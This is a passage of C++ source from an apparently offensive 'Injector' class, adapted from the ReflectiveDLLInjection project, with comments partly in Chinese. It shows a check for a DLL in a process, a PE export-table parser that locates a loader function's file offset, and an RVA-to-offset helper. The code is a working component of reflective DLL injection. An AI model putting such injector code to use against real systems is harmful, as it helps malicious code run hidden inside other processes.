        {
            bRet = TRUE;
            break;
        }
    }
    CloseHandle(hSnapshot);
    if (!bRet)
#ifdef _DEBUG
        cerr << "[!] DLL In Process Not Found\n";
#endif // _DEBUG

    return bRet;

}

DWORD Injector::dwGetOffset(HANDLE Image, CHAR* FuncName) {
    // 本段代码参考了著名反射式DLL注入项目
    // https://github.com/stephenfewer/ReflectiveDLLInjection


    UINT_PTR uiBaseAddress = 0;
    UINT_PTR uiExportDir = 0;
    UINT_PTR uiNameArray = 0;
    UINT_PTR uiAddressArray = 0;
    UINT_PTR uiNameOrdinals = 0;
    DWORD dwCounter = 0;

    uiBaseAddress = (UINT_PTR)Image;
    // get the File Offset of the modules NT Header
    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
    // uiNameArray = the address of the modules export directory entry
    uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    // get the File Offset of the export directory
    uiExportDir = uiBaseAddress + this->Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

    // get the File Offset for the array of name pointers
    uiNameArray = uiBaseAddress + this->Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

    // get the File Offset for the array of addresses
    uiAddressArray = uiBaseAddress + this->Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

    // get the File Offset for the array of name ordinals
    uiNameOrdinals = uiBaseAddress + this->Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

    // get a counter for the number of exported functions...
    dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

    // loop through all the exported functions to find the ReflectiveLoader
    while (dwCounter--)
    {
        char* cpExportedFunctionName = (char*)(uiBaseAddress + this->Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));

        //这里就开始比较导出函数的函数名称
        //if (strstr(cpExportedFunctionName, "ReflectiveLoader") != NULL)
        if (strstr(cpExportedFunctionName, FuncName) != NULL)
        {
            // get the File Offset for the array of addresses
            uiAddressArray = uiBaseAddress + this->Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

            // use the functions name ordinal as an index into the array of name pointers
            uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

            // return the File Offset to the ReflectiveLoader() functions code...
            return this->Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
        }
        // get the next exported function name
        uiNameArray += sizeof(DWORD);

        // get the next exported function name ordinal
        uiNameOrdinals += sizeof(WORD);
    }

    return 0;
}

DWORD Injector::Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
    WORD wIndex = 0;
    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;

    pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

    pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

    if (dwRva < pSectionHeader[0].PointerToRawData)
        return dwRva;

    for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
    {
        if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
            return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
    }

    return 0;
}



